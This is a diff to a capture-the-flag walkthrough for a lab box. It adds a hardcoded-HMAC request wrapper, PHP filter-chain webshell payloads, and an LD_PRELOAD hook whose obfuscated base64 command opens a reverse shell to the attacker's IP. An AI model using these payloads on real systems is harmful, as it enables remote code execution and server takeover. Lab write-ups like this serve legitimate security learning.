@@ -375,6 +375,31 @@ This is quite simple, just execute something like this:
 python3 php_filter_chain_generator.py --chain '<?php echo 1337; ?>'
 ```
 
+I'll create the file `fetch.php` for wrapping:
+```php
+<?php
+
+$path =  $argv[1] ?? '';   // read from command line
+
+if(str_ends_with($path, ".php"))
+        $path = 'php://filter/convert.base64-encode/resource=' . $path;
+
+$SECRET_KEY='an8h6oTlNB9N0HNcJMPYJWypPR2786IQ4I3woPA1BqoJ7hzIS0qQWi2EKmJvAgOW';
+$hash = hash_hmac('sha256', $path, $SECRET_KEY);
+
+$full_req = 'http://moebius/image.php?hash=' . hash_hmac('sha256', $path, $SECRET_KEY) . '&path=' .$path;
+
+echo "full request is: \n" . $full_req . "\n";
+
+$content = file_get_contents( $full_req );
+
+if(str_ends_with($path, ".php"))
+        $content = base64_decode( $content );
+
+echo $content;
+?>
+```
+
 and full command will be:
 ```bash
 php fetch.php $(python3 php_filter_chain_generator.py --chain '<?php echo 1337; ?>' )
@@ -402,12 +427,136 @@ as you can see, all the cool functions are disabled :(
 
 ![disabled functions](image-26.png)
 
+
 ### bypass disabled php functions
-LEARN!
+
+I learned from here how to exploit `LD_PRELOAD` in order to get `RCE`.
 
 [https://tryhackme.com/room/bypassdisablefunctions](https://tryhackme.com/room/bypassdisablefunctions)
 
-![enabled](image-21.png)
+This will be our `hook.c`, I've already put here the payload from `penelope`:
+```C
+#define  _GNU_SOURCE
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+__attribute__ ((__constructor__)) void preloadme(void) {
+  unsetenv("LD_PRELOAD"); // I want the command to being execute only once
+
+//   system(getenv("CMD"));
+  system("printf KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC4xMzIuMTY4LzQ0NDQgMD4mMSkgJg==|base64 -d|bash");
+
+}
+```
+We can compile it with this command
+```bash
+gcc -m64 -shared -fPIC -o hook.so hook.c -ldl
+```
+Now, let's set simple http python server for getting the `hook.so`:
+```bash
+python3 -m http.server 8081
+```
+
+
+
+Next, our webshell will be:
+```php
+<?php
+$h=curl_init("http://192.168.132.168:8081/hook.so");
+curl_setopt($h,19913,1);
+file_put_contents("/tmp/hook.so",curl_exec($h));
+
+// putenv('CMD=' . $_GET['cmd']);
+putenv("LD_PRELOAD=/tmp/hook.so");
+mail('a','a','a','a');
+?>
+```
+
+First, let's create our webshell for php command execution (base64 payload):
+```bash
+php fetch.php $(python3 php_filter_chain_generator.py --chain '<?=eval(base64_decode($_GET[0]))?>')
+```
+
+and we get this:
+```bash
+http://moebius/image.php?hash=011087a631de7dbb6e8228b254de3979eb1c0c7d5bf3aed42d6b75fd55b08162&path=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7
+|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv
+.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16
+|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv
+.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.bas
+e64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|conver
+t.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode
+|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-
+16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|conv
+ert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|conv
+ert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF
+8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.ic
+onv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.
+SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.
+iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG
+5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|c
+onvert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.C
+P949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030
+010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.
+iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|conv
+ert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-1
+6|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_J
+ISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.b
+ase64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|conve
+rt.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|co
+nvert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|conv
+ert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|conv
+ert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.ico
+nv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.
+IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-de
+code|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|conve
+rt.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.b
+ase64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UT
+F7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.i
+conv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-
+encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv
+.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.ic
+onv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
+```
+
+Now, we can execute commands with `&0=<base64 string>`. Notice this can't be too long.
+
+Our first commands will be, put the `hook.so` inside `/tmp/hook.so`:
+```php
+$h=curl_init("http://192.168.132.168:8081/hook.so");curl_setopt($h,19913,1);file_put_contents("/tmp/hook.so",curl_exec($h));
+```
+
+Using [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/#recipe=To_Base64('A-Za-z0-9%2B/%3D')&input=JGg9Y3VybF9pbml0KCJodHRwOi8vMTkyLjE2OC4xMzIuMTY4OjgwODEvaG9vay5zbyIpO2N1cmxfc2V0b3B0KCRoLDE5OTEzLDEpO2ZpbGVfcHV0X2NvbnRlbnRzKCIvdG1wL2hvb2suc28iLGN1cmxfZXhlYygkaCkpOw) we encode the string, and get this:
+```bash
+JGg9Y3VybF9pbml0KCJodHRwOi8vMTkyLjE2OC4xMzIuMTY4OjgwODEvaG9vay5zbyIpO2N1cmxfc2V0b3B0KCRoLDE5OTEzLDEpO2ZpbGVfcHV0X2NvbnRlbnRzKCIvdG1wL2hvb2suc28iLGN1cmxfZXhlYygkaCkpOw==
+```
+
+![encode](image-27.png)
+
+We can see it really works:
+
+![save on /tmp/hook.so](image-28.png)
+
+Next step, is to exeucte these commands, which is set the `LD_PRELOAD`, and trigger the exploit using `mail` function:
+```php
+putenv("LD_PRELOAD=/tmp/hook.so");mail('a','a','a','a');
+```
+
+Again, using [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/#recipe=To_Base64('A-Za-z0-9%2B/%3D')&input=cHV0ZW52KCJMRF9QUkVMT0FEPS90bXAvaG9vay5zbyIpO21haWwoJ2EnLCdhJywnYScsJ2EnKTs) I encoded the string:
+
+```bash
+cHV0ZW52KCJMRF9QUkVMT0FEPS90bXAvaG9vay5zbyIpO21haWwoJ2EnLCdhJywnYScsJ2EnKTs=
+```
+
+![encode](image-29.png)
+
+and we finnaly got reverse shell!
+
+![got shell](image-21.png)
+
+### Escapte from container
+
 
 ### Privilege Escalation to Root
 
